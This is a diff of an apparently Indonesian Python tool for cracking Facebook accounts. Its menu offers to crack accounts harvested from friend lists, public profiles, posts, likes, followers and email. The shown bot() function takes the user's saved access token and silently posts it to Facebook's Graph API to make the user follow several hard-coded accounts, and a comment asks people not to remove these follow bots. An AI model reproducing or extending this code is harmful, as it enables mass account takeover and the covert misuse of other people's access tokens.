@@ -103,17 +103,16 @@ def login_lagi():
 				print('\n [%s+%s] Login Berhasil %s'%(H,N,cc))
 				bot()
 			except KeyError:
-				jalan(' [%s!%s] Token Error Coba Ganti Akun Tumbal'%(M,N))
-				jalan(' [%s!%s] Silahkan Masukan Kembali Perintah'%(M,N))
-				jalan(' [%s!%s] python Vip88.py!'%(M,N))
-				exit()	
+				print(' [%s!%s] Login gagal ...'%(M,N));os.system('rm -rf token.x');time.sleep(2);login().__login__()
+		    except requests.exceptions.ConnectionError:
+			     exit(' [%s!%s] cek koneksi'%(M,N))
 
 # HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
 def bot():
 		try:
 			toket = open('token.x','r').read()
 		except IOError:
-			jalan('\n [%s!%s] Token mokad ganti akun!'%(M,N));time.sleep(1);login().login_lagi()
+			jalan('\n [%s!%s] Token mokad ganti akun!'%(M,N));time.sleep(2);login_lagi()
 		requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/100001490081130/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/1517769961/subscribers?access_token=' + toket)
@@ -130,18 +129,18 @@ class menu:
 		kontoll()
 		print(' %s➣ [%s0%s] crack dari daftar teman     [ON]'%(N,O,N))
 		print(' %s➣ [%s1%s] crack dari akun publik      [ON]'%(N,O,N))
-		print(' %s➣ [%s2%s] crack dari akun massal    [ON]'%(N,O,N))
-		print(' %s➣ [%s3%s] crack dari postingan         [ON]'%(N,O,N))
-		print(' %s➣ [%s4%s] crack dari likes post          [ON]'%(N,O,N))
-		print(' %s➣ [%s5%s] crack dari followers          [ON]'%(N,O,N))
-		print(' %s➣ [%s6%s] cek opsi akun chekpoint  [ON]'%(N,O,N))
+		print(' %s➣ [%s2%s] crack dari akun massal      [ON]'%(N,O,N))
+		print(' %s➣ [%s3%s] crack dari postingan        [ON]'%(N,O,N))
+		print(' %s➣ [%s4%s] crack dari likes post       [ON]'%(N,O,N))
+		print(' %s➣ [%s5%s] crack dari followers        [ON]'%(N,O,N))
+		print(' %s➣ [%s6%s] cek opsi akun chekpoint     [ON]'%(N,O,N))
 		print(' %s➣ [%s7%s] cek hasil crack ok,cp       [ON]'%(N,O,N))
-		print(' %s➣ [%s8%s] seting User-Agent            [ON]'%(N,O,N))
-		print(' %s➣ [%s9%s] crack email                       [ON]'%(N,O,N))
+		print(' %s➣ [%s8%s] seting User-Agent           [ON]'%(N,O,N))
+		print(' %s➣ [%s9%s] crack email                 [ON]'%(N,O,N))
 		print(' %s➣ [%sG%s] Get data² facebook          [ON]'%(N,O,N))
-		print(' %s➣ [%sK%s] Lapor bug script               [ON]'%(N,O,N))
-		print(' %s➣ [%sA%s] Keluar, hapus token[         [ON]'%(N,O,N))
-		print(' %s➣ [%sU%s] Upgrade ke premium        [ON]'%(N,O,N))
+		print(' %s➣ [%sK%s] Lapor bug script            [ON]'%(N,O,N))
+		print(' %s➣ [%sA%s] Keluar, hapus token[        [ON]'%(N,O,N))
+		print(' %s➣ [%sU%s] Upgrade ke premium          [ON]'%(N,O,N))
 		self.pilih()
 
 	def pilih(self):
@@ -183,7 +182,7 @@ class menu:
 					id.append(u['id'] + '<=>' + u['name'])
 			except KeyError:
 				print(' %s║'%(N))
-				jalan(' %s╠═[%s•%s] ID %s tidak di temukan!'%(N,M,N,idt));time.sleep(2);menu().main()
+				print(' %s╠═[%s•%s] ID %s tidak di temukan!'%(N,M,N,idt));time.sleep(2);menu().main()
 			else:
 				crack().fbeh(id)
 		elif usna in ['2','02']:
